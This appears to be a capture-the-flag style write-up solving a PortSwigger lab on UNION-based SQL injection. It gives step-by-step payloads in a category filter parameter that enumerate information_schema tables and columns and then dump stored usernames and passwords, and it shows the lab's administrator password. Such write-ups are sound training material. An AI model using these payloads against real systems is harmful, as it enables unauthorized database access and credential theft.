# SQL Injection Attack — Listing Database Contents on Non-Oracle Databases

> This writeup follows the OWASP Web Security Testing Guide (WSTG) methodology.

---

## Goal

Find the administrator username and password by enumerating the database, then log in.

---

## Lab

https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle

---

## OWASP Category

A03:2021 – Injection

---

## Core Concept

**UNION-based SQL injection** with full database enumeration using `information_schema` — available on PostgreSQL, MySQL, and MSSQL (not Oracle).

```sql
-- List all tables
SELECT table_name FROM information_schema.tables

-- List columns of a table
SELECT column_name FROM information_schema.columns WHERE table_name='users'
```

---

## Steps to Solve

---

**Step 1 — Find Injection Point and Column Count**

Injection point: **product category filter**

```
/filter?category=Pets'
```

Find columns with ORDER BY:

```
/filter?category=Pets' ORDER BY 1--
/filter?category=Pets' ORDER BY 2--
/filter?category=Pets' ORDER BY 3--
```

Confirm with UNION NULL:

```
/filter?category=Pets' UNION SELECT NULL,NULL--
```

Columns found: **2**

<img width="1346" height="426" alt="image" src="https://github.com/user-attachments/assets/db46bbf8-b60d-4949-a07d-98b5243e2e44" />

---

**Step 2 — Confirm String Columns**

```
/filter?category=Pets' UNION SELECT 'a','b'--
```

Both columns display strings in response.

<img width="456" height="112" alt="image" src="https://github.com/user-attachments/assets/a0fe477c-344c-4f31-871f-651fd8d03e49" />

---

**Step 3 — List All Tables**

```
/filter?category=Pets' UNION SELECT table_name,NULL FROM information_schema.tables--
```

All table names appear in the page response. Look for a table that looks like it stores users.

<img width="1578" height="8878" alt="image" src="https://github.com/user-attachments/assets/c2f523e9-0cd1-4c8d-abe9-ebddedbb8e0f" />


Table found: **users_pfoige** (or similar name)

---

**Step 4 — List Columns of Target Table**

Replace `users` with your actual table name found above:

```
/filter?category=Pets' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_pfoige'--
```

Column names appear in the response. Look for username and password columns.

<img width="641" height="136" alt="image" src="https://github.com/user-attachments/assets/a930fc38-cd0e-4b9f-a82e-84099ed92631" />

Columns found: **username_qlbsgz**, **password_iooqnv** (or similar names)

---

**Step 5 — Extract Usernames and Passwords**

Replace column names with your actual found column names:

```
/filter?category=Pets' UNION SELECT username_qlbsgz,password_iooqnv FROM users_pfoige--
```

All usernames and passwords appear directly in the page response.

<img width="1475" height="401" alt="image" src="https://github.com/user-attachments/assets/58f2d5e8-475d-481f-b6d7-a6743e218528" />

---

**Step 6 — Log In as Administrator**

- **Username:** `administrator`
- **Password:** `sz2z0pn1sat0l6wv8nuv`

---

**Lab Solved**

<img width="1562" height="697" alt="image" src="https://github.com/user-attachments/assets/61685141-f31b-480c-9d76-4800b634b049" />

---

*This writeup is intended for educational purposes only. All techniques documented here were performed on PortSwigger's intentionally vulnerable practice platform. The author does not encourage or condone the use of these methods against any system without explicit written permission. Unauthorized use of these techniques may violate applicable laws and regulations.*
